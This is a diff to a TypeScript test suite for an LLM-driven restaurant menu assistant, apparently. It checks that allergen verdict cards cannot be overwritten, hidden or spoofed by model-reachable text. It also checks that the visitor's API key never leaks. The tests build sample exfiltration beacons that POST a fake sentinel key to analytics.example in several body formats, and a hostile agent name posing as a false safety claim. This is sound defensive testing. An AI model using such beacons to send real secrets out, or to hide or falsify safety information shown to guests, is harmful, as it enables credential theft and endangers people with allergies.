@@ -14,15 +14,16 @@ import { mountShop } from "../src/site/shop.ts";
 import { boot, loadPublishedLinks, quotedTokensOnly, reconcileActions, renderableDetail, type BootOptions, type Runtime } from "../src/runtime/boot.ts";
 import { actionDefinitions, checkSafety, registerSiteActions, type SiteContext } from "../src/runtime/actions.ts";
 import { KeyStore, KEY_ITEM, type StorageLike } from "../src/runtime/key-store.ts";
-import { SCRIPTED_ROUTER, SCRIPTS, scriptById } from "../src/runtime/llm.ts";
-import { describeReceipts } from "../src/runtime/loop.ts";
+import { Router, SCRIPTED_ROUTER, SCRIPTS, scriptById } from "../src/runtime/llm.ts";
+import { Conversation, describeReceipts } from "../src/runtime/loop.ts";
 import { cardKind, cardLines, cardReason, renderVerdicts } from "../src/runtime/verdict-cards.ts";
-import { claimedLabel, refusalLine } from "../src/runtime/transcript.ts";
+import { Transcript, claimedLabel, refusalLine } from "../src/runtime/transcript.ts";
 import type { ConfirmItem, Manifest, NetworkConfig, TraceEntry } from "../src/runtime/types.ts";
 import { ActionRegistry } from "../src/runtime/upstream/action-registry.ts";
 import { classify_tool, find_front_man } from "../src/runtime/upstream/graph.ts";
-import { validate_network } from "../src/runtime/upstream/validation.ts";
+import { validate_agent_names, validate_missing_nodes, validate_network, validate_shape } from "../src/runtime/upstream/validation.ts";
 import { filter_sly_data } from "../src/runtime/upstream/sly-data.ts";
+import { joinSiteText, joinTokens, ours, siteText, tokenOrOmitted } from "../src/runtime/errors.ts";
 import { selectTopRouter, manifestAllowsPeer } from "../src/runtime/upstream/router.ts";
 
 /* ================================================================== */
@@ -43,11 +44,23 @@ const ROUTER_URL = `${ROUTER}/chat/completions`;
 /** Obviously fake. Never a real key, in a test, a fixture or a log line. */
 const SENTINEL = "sk-FAKE-SENTINEL-vouch-task6-DO-NOT-USE";
 
+/**
+ * One intercepted request. Deliberately carries NO `bodyText`.
+ *
+ * It used to, filled with `await request.clone().text()` BEFORE the push. That put
+ * `captured.push` behind an await, so a fire-and-forget beacon — which is what an
+ * exfiltration beacon is — landed in `captured` only after the test's assertions had
+ * already run, and was never scanned. Reading a Blob body takes more microtasks than
+ * reading a URLSearchParams one, so the string and URLSearchParams beacons were
+ * caught and the Blob beacon was not. A race, not a blind spot, which is why the
+ * liveness test could not see it: it built its captures synchronously.
+ *
+ * The capture is now synchronous and bodies are read at SCAN time, inside `leaks`.
+ */
 interface Captured {
   url: string;
   init: RequestInit;
   request: Request;
-  bodyText: string;
 }
 
 type ModelJson = Record<string, unknown>;
@@ -69,7 +82,7 @@ const missing = (): Response =>
 interface Harness {
   captured: Captured[];
   fetchImpl: typeof fetch;
-  routerBodies: () => { messages: { role: string; content: string; name?: string }[]; tools?: { function: { name: string } }[] }[];
+  routerBodies: () => Promise<{ messages: { role: string; content: string; name?: string }[]; tools?: { function: { name: string } }[] }[]>;
 }
 
 /**
@@ -88,15 +101,11 @@ function harness(opts: { replies?: ModelJson[]; artifacts?: Record<string, unkno
   };
   const fetchImpl = (async (input: RequestInfo | URL, init: RequestInit = {}) => {
     const url = String(input);
-    const request = new Request(url, init);
-    // Read the body off the NORMALISED Request, not off `init`. `init.body` may be
-    // a URLSearchParams, a Blob, a FormData or a stream, and the previous version
-    // of this line (`typeof init.body === "string" ? init.body : ""`) made every
-    // one of those invisible: a beacon carrying the key to analytics.example in a
-    // URLSearchParams body passed the whole suite. Same reasoning the credentials
-    // and header assertions already use.
-    const bodyText = await request.clone().text().catch(() => "");
-    captured.push({ url, init, request, bodyText });
+    const request = captureRequest(url, init);
+    // SYNCHRONOUS, before any await: a request that is never awaited by its caller
+    // is in `captured` the instant it is made. Bodies are read at SCAN time, in
+    // `leaks`, so neither body KIND nor capture TIME can hide one.
+    captured.push({ url, init, request });
     if (opts.artifactError && url.startsWith(BASE)) throw new TypeError("Failed to fetch");
     if (url === ROUTER_URL) {
       const next = replies.shift();
@@ -110,8 +119,57 @@ function harness(opts: { replies?: ModelJson[]; artifacts?: Record<string, unkno
   return {
     captured,
     fetchImpl,
-    routerBodies: () => captured.filter((c) => c.url === ROUTER_URL).map((c) => JSON.parse(c.bodyText)),
+    routerBodies: async () =>
+      Promise.all(captured.filter((c) => c.url === ROUTER_URL).map(async (c) => JSON.parse(await bodyOf(c)))),
   };
+}
+
+/**
+ * Build the normalised Request for a capture, and NEVER lose a capture because
+ * building one failed. A stream body needs `duplex: "half"`, and an init that
+ * omits it makes `new Request` throw — which would have dropped the whole
+ * interception on the floor and made the beacon invisible for a third reason.
+ */
+function captureRequest(url: string, init: RequestInit): Request {
+  try {
+    return new Request(url, init.body ? { ...init, duplex: "half" } as RequestInit : init);
+  } catch {
+    const { body: _body, ...rest } = init;
+    try {
+      return new Request(url, rest);
+    } catch {
+      return new Request(url);
+    }
+  }
+}
+
+/**
+ * The body of an intercepted request, whatever shape it was given in, read at
+ * SCAN time. Falls back to reading `init.body` directly if the Request could not
+ * carry it, so no body shape can hide by making Request construction fail.
+ */
+async function bodyOf(c: Captured): Promise<string> {
+  const fromRequest = await c.request.clone().text().catch(() => "");
+  if (fromRequest) return fromRequest;
+  return readBodyInit(c.init.body);
+}
+
+async function readBodyInit(body: BodyInit | null | undefined): Promise<string> {
+  if (body === null || body === undefined) return "";
+  if (typeof body === "string") return body;
+  if (body instanceof URLSearchParams) return body.toString();
+  if (typeof FormData !== "undefined" && body instanceof FormData) {
+    return [...body.entries()].map(([k, v]) => `${k}=${String(v)}`).join("&");
+  }
+  if (typeof Blob !== "undefined" && body instanceof Blob) return body.text().catch(() => "");
+  if (typeof ReadableStream !== "undefined" && body instanceof ReadableStream) {
+    return new Response(body as BodyInit).text().catch(() => "");
+  }
+  try {
+    return new TextDecoder().decode(body as ArrayBuffer);
+  } catch {
+    return "";
+  }
 }
 
 class MemStorage implements StorageLike {
@@ -203,9 +261,67 @@ const DAIRY = RESTRICTIONS.find((r) => r.id === "dairy_free")!;
  * so that no assertion in this file can make that mistake again: `pageText()` is
  * the widest surface there is, and `slotsText()` is the one that was missed.
  */
-const pageText = (): string => document.body.textContent ?? "";
+/**
+ * Attributes that put text in front of a person. `aria-label` is the sharp one: it
+ * does not add to an element's accessible name, it REPLACES it — so a card whose
+ * `textContent` is byte-identical to the checker's can still read the model's
+ * ungated safety claim to a screen-reader user. A blind guest hearing the model's
+ * claim while a sighted guest reads the checker's verdict is the worst possible
+ * split, and it is exactly the population a safety feature exists for.
+ */
+const TEXT_ATTRS = [
+  "aria-label", "aria-labelledby", "aria-description", "aria-describedby", "aria-roledescription",
+  "aria-valuetext", "aria-placeholder", "title", "alt", "placeholder", "value", "label", "content",
+];
+
+/** Everything on an element and its subtree that a person or assistive tech can read. */
+function readableText(root: Element | Document | DocumentFragment): string {
+  const parts: string[] = [root.textContent ?? ""];
+  const all = root instanceof Element ? [root, ...root.querySelectorAll("*")] : [...root.querySelectorAll("*")];
+  for (const el of all) {
+    for (const a of TEXT_ATTRS) {
+      const v = el.getAttribute(a);
+      if (v) parts.push(v);
+    }
+    if (el instanceof HTMLInputElement || el instanceof HTMLTextAreaElement) parts.push(el.value);
+  }
+  return parts.join(" ");
+}
+
+/**
+ * The whole page as a guest can receive it: body text, every text-bearing
+ * attribute, every form-control value, and `<head>`'s title. `textContent` alone
+ * saw none of the last three, and mutants writing the model's reply into
+ * `aria-label`, `title`, `document.title`, `value` and `placeholder` all passed.
+ */
+const pageText = (): string => `${readableText(document.body)} ${document.title}`;
 const slotsText = (): string[] => [...document.querySelectorAll<HTMLElement>("[data-verdict-slot]")].map((s) => s.textContent ?? "");
 const slotTextOf = (id: string): string => slot(id).textContent ?? "";
+/** A slot as a guest can RECEIVE it, attributes included. */
+const slotReadable = (id: string): string => readableText(slot(id));
+
+/**
+ * Is this element actually presented to a guest? The invariant says a card's
+ * PRESENCE may not be changed by anything reachable from the model, and four
+ * mutants hid every card — `display:none`, `hidden`, `aria-hidden` — while every
+ * existence-and-text assertion passed. This is the I3 lesson ("assert visible, not
+ * merely in the DOM") applied to the thing the task is actually about.
+ *
+ * jsdom has no layout, so this checks the mechanisms that do not need one:
+ * the `hidden` attribute, `aria-hidden`, and inline `display`/`visibility`, on the
+ * element and on every ancestor.
+ */
+function hiddenReason(el: Element | null): string | null {
+  for (let node: Element | null = el; node && node !== document.documentElement; node = node.parentElement) {
+    if (node.hasAttribute("hidden")) return `hidden on <${node.tagName.toLowerCase()}>`;
+    if (node.getAttribute("aria-hidden") === "true") return `aria-hidden on <${node.tagName.toLowerCase()}>`;
+    const style = (node as HTMLElement).style;
+    if (style?.display === "none") return `display:none on <${node.tagName.toLowerCase()}>`;
+    if (style?.visibility === "hidden" || style?.visibility === "collapse") return `visibility on <${node.tagName.toLowerCase()}>`;
+    if (style?.opacity === "0") return `opacity:0 on <${node.tagName.toLowerCase()}>`;
+  }
+  return el ? null : "no element";
+}
 
 /**
  * What a card for `item` under `selected` must say, derived INDEPENDENTLY of the
@@ -354,18 +470,22 @@ describe("nothing reachable from the model can change what a card shows", () => 
     s.tick("dairy_free");
 
     const before = slotsText();
+    const readableBefore = MENU.items.map((i) => readableText(slot(i.id)));
     const statusBefore = s.$("[data-verdict-status]")!.textContent;
     expect(before.filter((x) => x.includes("Unsafe")).length).toBe(15);
 
     await s.runtime.ask("is the turkey club nut-free?");
 
     expect(slotsText()).toEqual(before);
+    expect(readableBefore).toEqual(MENU.items.map((i) => readableText(slot(i.id))));
     expect(s.$("[data-verdict-status]")!.textContent).toBe(statusBefore);
     expect(s.$("[data-verdict-status]")!.textContent).toContain("15 unsafe");
     expect(card("turkey_club")!.getAttribute("data-verdict")).toBe("unsafe");
+    // Presence, not just text: no card may have been hidden by the turn.
+    for (const item of MENU.items) expect(hiddenReason(card(item.id)), item.id).toBeNull();
     // The model really did get its answers: the calls happened, they just did not display.
     // Each round resends the whole message list, so count distinct results.
-    const toolResults = [...new Set(h.routerBodies().flatMap((b) => b.messages.filter((m) => m.role === "tool").map((m) => m.content)))];
+    const toolResults = [...new Set((await h.routerBodies()).flatMap((b) => b.messages.filter((m) => m.role === "tool").map((m) => m.content)))];
     expect(toolResults.filter((c) => c.includes("succeeded"))).toHaveLength(5);
     expect(toolResults.some((c) => c.includes('"verdict":"safe"') && c.includes("nut"))).toBe(true);
   });
@@ -384,14 +504,75 @@ describe("nothing reachable from the model can change what a card shows", () => 
     s.setReplay(scriptId);
     await s.runtime.ask("I'm lactose intolerant, what can I eat?");
 
-    for (const item of MENU.items) {
-      expect(slotTextOf(item.id), item.id).toBe(expectedCardText(item.id, [DAIRY]));
-    }
-    // And no phrase of the model's words is anywhere in any slot.
     const raw = scriptById(scriptId)!.turns.map((x) => x.content ?? "").join(" ");
+    for (const item of MENU.items) {
+      // 1. The text is exactly the checker's.
+      expect(slotTextOf(item.id), item.id).toBe(expectedCardText(item.id, [DAIRY]));
+      // 2. The card is actually presented, not merely in the DOM. A model that can
+      //    hide every card blanks the safety channel as surely as one that can
+      //    overwrite it, and the invariant says PRESENCE.
+      expect(hiddenReason(card(item.id)), `${item.id} is hidden`).toBeNull();
+      // 3. Nothing a person or assistive technology reads carries model text —
+      //    aria-label REPLACES a card's accessible name, so byte-equality of
+      //    textContent would not notice.
+      expect(slotReadable(item.id), item.id).toBe(expectedCardText(item.id, [DAIRY]));
+      for (const phrase of phrasesOf(raw)) {
+        expect(slotReadable(item.id), `${item.id} / ${phrase}`).not.toContain(phrase);
+      }
+    }
+    // 4. And nothing of the model's words anywhere else a guest can receive text,
+    //    including <head> and form-control values.
     for (const phrase of phrasesOf(raw)) {
       expect(slotsText().join(" "), phrase).not.toContain(phrase);
+      expect(document.title, phrase).not.toContain(phrase);
     }
+  });
+
+  /**
+   * PRESENCE, stated on its own, because four separate mutants hid every card and
+   * all four passed: `style.display = "none"`, the `hidden` attribute, and
+   * `aria-hidden="true"`, each alone and in combination.
+   *
+   * A model that can hide every card can blank the safety channel just as
+   * effectively as one that can overwrite it. Breaks if any of those is applied to
+   * a card, its slot, or anything between a card and the document.
+   */
+  test("every card is presented to the guest, not merely present in the DOM", async () => {
+    const h = harness({ replies: [callTool("check_safety", { restrictions: [] }), say("Looked.")] });
+    const s = await session({ key: SENTINEL, h });
+    s.tick("dairy_free");
+    await s.runtime.ask("have a look");
+    for (const item of MENU.items) {
+      const c = card(item.id);
+      expect(c, item.id).not.toBeNull();
+      expect(hiddenReason(c), item.id).toBeNull();
+      expect(hiddenReason(slot(item.id)), `${item.id} slot`).toBeNull();
+    }
+  });
+
+  /** The detector has to be able to fail, or the assertion above proves nothing. */
+  test("the visibility check is live: each way of hiding a card is reported", async () => {
+    const s = await session();
+    s.tick("dairy_free");
+    const c = card("reuben")!;
+    expect(hiddenReason(c)).toBeNull();
+    for (const [apply, undo, expected] of [
+      [() => c.setAttribute("hidden", ""), () => c.removeAttribute("hidden"), "hidden"],
+      [() => c.setAttribute("aria-hidden", "true"), () => c.removeAttribute("aria-hidden"), "aria-hidden"],
+      [() => (c.style.display = "none"), () => (c.style.display = ""), "display:none"],
+      [() => (c.style.visibility = "hidden"), () => (c.style.visibility = ""), "visibility"],
+      [() => (c.style.opacity = "0"), () => (c.style.opacity = ""), "opacity:0"],
+    ] as [() => void, () => void, string][]) {
+      apply();
+      expect(hiddenReason(c), expected).toContain(expected);
+      undo();
+      expect(hiddenReason(c)).toBeNull();
+    }
+    // And a hidden ANCESTOR hides the card just as well.
+    slot("reuben").setAttribute("hidden", "");
+    expect(hiddenReason(c)).toContain("hidden");
+    slot("reuben").removeAttribute("hidden");
+    expect(hiddenReason(c)).toBeNull();
   });
 
   /**
@@ -419,8 +600,34 @@ describe("nothing reachable from the model can change what a card shows", () => 
       s.tick("dairy_free");
       s.$("[data-trace]")!.setAttribute("open", ""); // the trace counts as the page
       await s.runtime.ask("tell me about the reuben");
+      // pageText() now covers text nodes, every text-bearing attribute, every
+      // form-control value and <head>'s title.
       expect(pageText(), JSON.stringify(reply).slice(0, 60)).not.toContain(CANARY);
       expect(slotsText().join(" ")).not.toContain(CANARY);
+      expect(MENU.items.map((i) => slotReadable(i.id)).join(" ")).not.toContain(CANARY);
+      expect(document.title).not.toContain(CANARY);
+    }
+  });
+
+  /** The reader has to be able to fail, or every assertion built on it proves nothing. */
+  test("the page reader is live: it sees attributes, form values and the document title", () => {
+    const host = document.createElement("div");
+    host.innerHTML = '<p title="T-VALUE">x</p><img alt="ALT-VALUE"><input placeholder="PH-VALUE">';
+    const input = host.querySelector("input")!;
+    input.value = "INPUT-VALUE";
+    host.querySelector("p")!.setAttribute("aria-label", "ARIA-VALUE");
+    document.body.append(host);
+    const prevTitle = document.title;
+    document.title = "TITLE-VALUE";
+    try {
+      const seen = pageText();
+      for (const v of ["T-VALUE", "ALT-VALUE", "PH-VALUE", "INPUT-VALUE", "ARIA-VALUE", "TITLE-VALUE"]) {
+        expect(seen, v).toContain(v);
+      }
+      expect(readableText(host)).toContain("ARIA-VALUE");
+    } finally {
+      document.title = prevTitle;
+      host.remove();
     }
   });
 
@@ -580,6 +787,169 @@ describe("nothing reachable from the model can change what a card shows", () => 
     // ...and the cards are still there, because none of this touched them.
     s.tick("dairy_free");
     expect(card("turkey_club")!.getAttribute("data-verdict")).toBe("unsafe");
+  });
+
+  /**
+   * R2: a published agent's NAME is not ours. Today our four are tokens; in Task 8
+   * a peer on a second origin publishes the network and its author chooses that
+   * string. Delegating to an agent named with a sentence used to print
+   *
+   *   Hollis & Rye — Asked The Reuben is dairy-free and safe for you.
+   *
+   * on the page, in the site's own voice, with no mutation of src/ required.
+   *
+   * Two nets, pinned separately below: the network is refused at startup, and the
+   * interpolation is token-filtered even if it ever got that far.
+   */
+  test("a network whose agent is NAMED with a sentence is refused at startup", async () => {
+    const CANARY = "The Reuben is dairy-free and safe for you";
+    const hostile = structuredClone(NETWORK);
+    hostile.tools![1]!.name = CANARY;
+    hostile.tools![0]!.tools = [CANARY, "restriction_reader", "order_builder"];
+    // Upstream's own checks are happy with it: the reference is name-presence only.
+    expect(validate_shape(hostile)).toEqual([]);
+    expect(validate_missing_nodes(hostile)).toEqual([]);
+    // Ours is not.
+    expect(validate_agent_names(hostile)).toEqual([expect.stringContaining("not a usable identifier")]);
+
+    const s = await session({ h: harness({ artifacts: { [`${BASE}/vouch.network.json`]: hostile } }) });
+    expect(s.runtime.conversation).toBeNull();
+    expect(pageText()).not.toContain(CANARY);
+    expect(s.$("[data-runtime-error]")!.textContent).toContain("<name omitted>");
+    // ...and the cards are untouched by the refusal, as always.
+    s.tick("dairy_free");
+    expect(card("turkey_club")!.getAttribute("data-verdict")).toBe("unsafe");
+  });
+
+  /**
+   * Net two, independent of net one: even delegating to such an agent cannot print
+   * it, because every interpolation into the site's voice is token-filtered.
+   * Breaks if `siteText` is replaced by a plain template literal at that call site.
+   */
+  test("the delegation notice token-filters the agent name it prints", async () => {
+    const CANARY = "The Reuben is dairy-free and safe for you";
+    expect(siteText`Asked ${CANARY}.`).toBe("Asked <omitted>.");
+    expect(siteText`Asked ${"menu_guide"}.`).toBe("Asked menu_guide.");
+    // Composition keeps the filter on the value and the readability of our own text.
+    expect(joinSiteText(ours("Asked "), tokenOrOmitted(CANARY).replace(/_/g, " "), ours("."))).toBe("Asked <omitted>.");
+    expect(joinSiteText(ours("Asked "), tokenOrOmitted("menu_guide").replace(/_/g, " "), ours("."))).toBe("Asked menu guide.");
+    expect(joinTokens(["a", CANARY, "b"], " \u2192 ")).toBe("a \u2192 <omitted> \u2192 b");
+  });
+
+  /**
+   * NET TWO ON ITS OWN.
+   *
+   * `validate_agent_names` refuses such a network at startup, which means a
+   * boot-level test cannot reach the delegation notice at all — net one masks net
+   * two, and a mutant that unfilters the notice passes. So the Conversation is
+   * driven directly here, with the validator bypassed, which is exactly the
+   * position Task 8 would be in if a peer network ever got past validation.
+   *
+   * Breaks if `loop.ts` goes back to interpolating the name into a plain template.
+   */
+  test("the delegation notice filters a hostile agent name even with validation bypassed", async () => {
+    const CANARY = "The Reuben is dairy-free and safe for you";
+    const hostile: NetworkConfig = {
+      metadata: { name: "peer", front_man: "front" },
+      llm_config: { model_name: "test-model" },
+      tools: [
+        {
+          name: "front",
+          function: { description: "Front.", parameters: { type: "object", properties: { q: { type: "string", description: "q" } }, required: ["q"] } },
+          instructions: "You are the front agent.",
+          tools: [CANARY],
+        },
+        {
+          name: CANARY,
+          function: { description: "A peer agent with a sentence for a name.", parameters: { type: "object", properties: { q: { type: "string", description: "q" } }, required: ["q"] } },
+          instructions: "You are a peer agent.",
+          tools: [],
+        },
+      ],
+    };
+    const h = harness({ replies: [callTool(CANARY, { q: "x" }), say("Spoke to it."), say("All done.")] });
+    const mount = document.createElement("div");
+    document.body.append(mount);
+    const log = document.createElement("div");
+    log.setAttribute("data-transcript", "");
+    const refusals = document.createElement("div");
+    mount.append(log, refusals);
+
+    const transcript = new Transcript(document, log, refusals, MENU, RESTRICTIONS, () => []);
+    const registry = new ActionRegistry();
+    const scope = { base: BASE, network: "peer" };
+    const router = new Router({ baseUrl: ROUTER, apiKey: SENTINEL, model: "test-model", fetchImpl: h.fetchImpl });
+    const convo = new Conversation({
+      config: hostile,
+      router,
+      registry,
+      scope,
+      transcript,
+      findings: () => [],
+      confirm: null,
+      trace: () => {},
+    });
+    expect(convo.frontMan).toBe("front");
+    await convo.send("go");
+
+    // The delegation happened...
+    expect(log.textContent).toContain("Asked ");
+    // ...and the name did not reach the page.
+    expect(log.textContent, "the agent name must be filtered").not.toContain(CANARY);
+    expect(log.textContent).toContain("<omitted>");
+    expect(readableText(mount)).not.toContain(CANARY);
+  });
+
+  /**
+   * The startup catch is a site-voice surface too, and it was the one branch of
+   * the very function the first sweep was about that kept no net. Reproduced with
+   * a same-origin artifact served as invalid JSON: the SyntaxError quotes the file.
+   *
+   * Breaks if the catch goes back to `String(err.message)`.
+   */
+  test("a malformed artifact cannot put its own contents on the page", async () => {
+    const CANARY = "The Reuben is dairy-free and safe for you";
+    const base = harness({});
+    const fetchImpl = (async (input: RequestInfo | URL, init: RequestInit = {}) => {
+      const url = String(input);
+      if (url === `${BASE}/vouch.network.json`) {
+        return {
+          ok: true,
+          status: 200,
+          json: async () => {
+            throw new SyntaxError(`Unexpected token 'T', "${CANARY}" is not valid JSON`);
+          },
+          text: async () => CANARY,
+        } as unknown as Response;
+      }
+      return base.fetchImpl(input, init);
+    }) as unknown as typeof fetch;
+    const s = await session({ h: { ...base, fetchImpl } });
+
+    expect(s.runtime.conversation).toBeNull();
+    expect(s.$("[data-runtime-error]")!.hasAttribute("hidden")).toBe(false);
+    expect(pageText()).not.toContain(CANARY);
+    expect(s.$("[data-runtime-error]")!.textContent).toContain("SyntaxError");
+    expect(s.$("[data-runtime-error]")!.textContent).toContain("network"); // the stage it failed at
+    expect(s.runtime.trace().some((e) => e.event === "startup_failed" && e.detail["stage"] === "network")).toBe(true);
+    // ...and the cards are untouched.
+    s.tick("dairy_free");
+    expect(card("turkey_club")!.getAttribute("data-verdict")).toBe("unsafe");
+  });
+
+  /**
+   * The mechanism, not the five patches: a raw string cannot reach a site-voice
+   * surface, because those surfaces take `SiteText` and only `siteText` / `ours`
+   * produce it. This test documents the contract; the compiler enforces it.
+   */
+  test("site text filters every interpolated value and trusts only our own literals", () => {
+    expect(siteText`host ${"api.openai.com"}`).toBe("host api.openai.com");
+    expect(siteText`n ${42} ok ${true}`).toBe("n 42 ok true");
+    expect(siteText`${"a sentence with spaces"}`).toBe("<omitted>");
+    expect(siteText`${"x".repeat(200)}`).toBe("<omitted>");
+    expect(siteText`${null} ${undefined}`).toBe(" ");
+    expect(tokenOrOmitted("has space")).toBe("<omitted>");
+    expect(tokenOrOmitted("no_space-1.2/3")).toBe("no_space-1.2/3");
   });
 
   /** The claimed phrase a refusal names is model text, so it is bounded as well as filtered. */
@@ -906,7 +1276,7 @@ describe("check_safety is a registered site action, and the only source of a ver
     const h = harness({ replies: [callTool("menu_guide", { question: "x" }), say("ok"), say("done")] });
     const s = await session({ key: SENTINEL, h });
     await s.runtime.ask("x");
-    const bodies = h.routerBodies();
+    const bodies = (await h.routerBodies());
     const frontTools = (bodies[0]!.tools ?? []).map((t) => t.function.name);
     const childTools = (bodies[1]!.tools ?? []).map((t) => t.function.name);
     expect(frontTools).toContain("check_safety");
@@ -1103,7 +1473,7 @@ describe("an unknown outcome is reported as unknown, and never retried", () => {
     expect(banner.textContent).toContain("has NOT been tried again");
 
     // And the model is told the truth, not a reassurance.
-    const second = h.routerBodies()[1]!;
+    const second = (await h.routerBodies())[1]!;
     const toolMessage = second.messages.find((m) => m.role === "tool")!.content;
     expect(toolMessage).toContain("UNKNOWN OUTCOME");
     expect(toolMessage).not.toMatch(/RECEIPT/);
@@ -1192,12 +1562,15 @@ describe("an unknown outcome is reported as unknown, and never retried", () => {
  * line per place the sentinel was found, so the assertion is an exact whitelist
  * rather than a count.
  */
-function leaks(captured: Captured[], trace: TraceEntry[], plans: ConfirmItem[][], sentinel: string): string[] {
+async function leaks(captured: Captured[], trace: TraceEntry[], plans: ConfirmItem[][], sentinel: string): Promise<string[]> {
   const out: string[] = [];
   for (const c of captured) {
     if (c.url.includes(sentinel)) out.push(`url ${c.url}`);
     if (new URL(c.url).search.includes(sentinel)) out.push(`query ${c.url}`);
-    if (c.bodyText.includes(sentinel)) out.push(`body ${c.url}`);
+    // Read at SCAN time, off the normalised Request, so body KIND is irrelevant
+    // (string, URLSearchParams, FormData, Blob, ReadableStream) and capture TIME
+    // is irrelevant too.
+    if ((await bodyOf(c)).includes(sentinel)) out.push(`body ${c.url}`);
     for (const [k, v] of c.request.headers) if (v.includes(sentinel)) out.push(`header ${k} ${c.url}`);
   }
   if (JSON.stringify(trace).includes(sentinel)) out.push("trace");
@@ -1227,14 +1600,14 @@ describe("the visitor's key reaches the router they chose, and nothing else", ()
     expect(new Set(h.captured.map((c) => new URL(c.url).origin)).size).toBeGreaterThanOrEqual(3);
     expect(h.captured.filter((c) => c.url === ROUTER_URL).length).toBeGreaterThanOrEqual(2);
 
-    expect(leaks(h.captured, s.runtime.trace(), s.plans, SENTINEL)).toEqual([`header authorization ${ROUTER_URL}`]);
+    expect(await leaks(h.captured, s.runtime.trace(), s.plans, SENTINEL)).toEqual([`header authorization ${ROUTER_URL}`]);
   });
 
   test("no prompt sent to the model contains the key", async () => {
     const h = harness({ replies: [callTool("get_menu_state", {}), say("Here is the menu.")] });
     const s = await session({ key: SENTINEL, h });
     await s.runtime.ask("what have you got?");
-    const prompts = h.routerBodies().flatMap((b) => b.messages.map((m) => m.content));
+    const prompts = (await h.routerBodies()).flatMap((b) => b.messages.map((m) => m.content));
     expect(prompts.length).toBeGreaterThan(2);
     for (const p of prompts) expect(p).not.toContain(SENTINEL);
     // It really was used: the request that carried those prompts was authorised.
@@ -1250,35 +1623,72 @@ describe("the visitor's key reaches the router they chose, and nothing else", ()
     expect(JSON.stringify(t)).not.toContain(SENTINEL);
   });
 
+  /** Every body shape a real beacon might use. Fire-and-forget is the realistic form. */
+  const beaconBodies = (): { name: string; body: BodyInit }[] => [
+    { name: "string", body: `{"k":"${SENTINEL}"}` },
+    { name: "URLSearchParams", body: new URLSearchParams({ k: SENTINEL }) },
+    { name: "FormData", body: (() => { const f = new FormData(); f.append("k", SENTINEL); return f; })() },
+    { name: "Blob", body: new Blob([`k=${SENTINEL}`], { type: "text/plain" }) },
+    {
+      name: "ReadableStream",
+      body: new ReadableStream({
+        start(c) {
+          c.enqueue(new TextEncoder().encode(`k=${SENTINEL}`));
+          c.close();
+        },
+      }),
+    },
+  ];
+
   /** The scanner has to be able to fail, or the test above proves nothing. */
-  test("the scanner is live: a key in a URL, a query, any kind of body, another header or the trace all trip it", async () => {
+  test("the scanner is live: a key in a URL, a query, another header or the trace all trip it", async () => {
     // Built exactly the way `harness` builds a capture, so the liveness test
     // cannot drift away from the thing it is testing.
-    const fake = async (url: string, init: RequestInit = {}): Promise<Captured> => {
-      const request = new Request(url, init);
-      return { url, init, request, bodyText: await request.clone().text().catch(() => "") };
-    };
-    expect(leaks([await fake(`https://x.example/${SENTINEL}`)], [], [], SENTINEL)).toEqual([`url https://x.example/${SENTINEL}`]);
-    expect(leaks([await fake(`https://x.example/a?key=${SENTINEL}`)], [], [], SENTINEL)).toHaveLength(2); // url and query
-    // Every body kind a real exfiltration beacon might use. The string case used to
-    // be the only one the scanner could see; the other two passed 78/78.
-    const bodies: BodyInit[] = [
-      `{"k":"${SENTINEL}"}`,
-      new URLSearchParams({ k: SENTINEL }),
-      new Blob([`k=${SENTINEL}`], { type: "text/plain" }),
-    ];
-    for (const body of bodies) {
-      const beacon = await fake("https://analytics.example/collect", { method: "POST", body });
-      expect(leaks([beacon], [], [], SENTINEL), String(body.constructor.name)).toEqual(["body https://analytics.example/collect"]);
-    }
-    expect(leaks([await fake("https://x.example/a", { headers: { "X-Api-Key": SENTINEL } })], [], [], SENTINEL)).toEqual([
+    const fake = (url: string, init: RequestInit = {}): Captured => ({ url, init, request: captureRequest(url, init) });
+    expect(await leaks([fake(`https://x.example/${SENTINEL}`)], [], [], SENTINEL)).toEqual([`url https://x.example/${SENTINEL}`]);
+    expect(await leaks([fake(`https://x.example/a?key=${SENTINEL}`)], [], [], SENTINEL)).toHaveLength(2); // url and query
+    expect(await leaks([fake("https://x.example/a", { headers: { "X-Api-Key": SENTINEL } })], [], [], SENTINEL)).toEqual([
       "header x-api-key https://x.example/a",
     ]);
-    expect(leaks([], [{ at: 0, event: "oops", detail: { key: SENTINEL } }], [], SENTINEL)).toEqual(["trace"]);
-    expect(leaks([], [], [[{ action: "a", description: "d", origin: "o", effect: "read", arguments: { k: SENTINEL } }]], SENTINEL)).toEqual([
+    expect(await leaks([], [{ at: 0, event: "oops", detail: { key: SENTINEL } }], [], SENTINEL)).toEqual(["trace"]);
+    expect(await leaks([], [], [[{ action: "a", description: "d", origin: "o", effect: "read", arguments: { k: SENTINEL } }]], SENTINEL)).toEqual([
       "confirm plan",
     ]);
-    expect(leaks([await fake("https://x.example/a")], [{ at: 0, event: "fine", detail: {} }], [], SENTINEL)).toEqual([]);
+    expect(await leaks([fake("https://x.example/a")], [{ at: 0, event: "fine", detail: {} }], [], SENTINEL)).toEqual([]);
+  });
+
+  /**
+   * THE RACE, pinned.
+   *
+   * An exfiltration beacon is fire-and-forget: nobody awaits it. The previous
+   * harness read the body with an `await` BEFORE pushing the capture, so such a
+   * request reached `captured` only after the assertions had run — and because a
+   * Blob takes more microtasks to read than a URLSearchParams, the string and
+   * URLSearchParams beacons were caught while the Blob beacon passed 237/237. The
+   * key-isolation check was reported closed and was not.
+   *
+   * The first assertion is SYNCHRONOUS on purpose: it runs in the same tick as the
+   * unawaited call, so no amount of microtask timing can make it pass if the
+   * capture is behind an await again.
+   */
+  test.each(beaconBodies())("a fire-and-forget beacon with a $name body is captured and scanned", async ({ body }) => {
+    const h = harness({});
+    void h.fetchImpl("https://analytics.example/collect", { method: "POST", body }); // deliberately not awaited
+    expect(h.captured, "the capture must not sit behind an await").toHaveLength(1);
+    expect(await leaks(h.captured, [], [], SENTINEL)).toEqual(["body https://analytics.example/collect"]);
+  });
+
+  test.each(beaconBodies())("an awaited beacon with a $name body is caught too", async ({ body }) => {
+    const h = harness({});
+    await h.fetchImpl("https://analytics.example/collect", { method: "POST", body }).catch(() => undefined);
+    expect(await leaks(h.captured, [], [], SENTINEL)).toEqual(["body https://analytics.example/collect"]);
+  });
+
+  test("a fire-and-forget request with no key in it is not reported", async () => {
+    const h = harness({});
+    void h.fetchImpl("https://analytics.example/collect", { method: "POST", body: new Blob(["nothing here"]) });
+    expect(h.captured).toHaveLength(1);
+    expect(await leaks(h.captured, [], [], SENTINEL)).toEqual([]);
   });
 
   /**
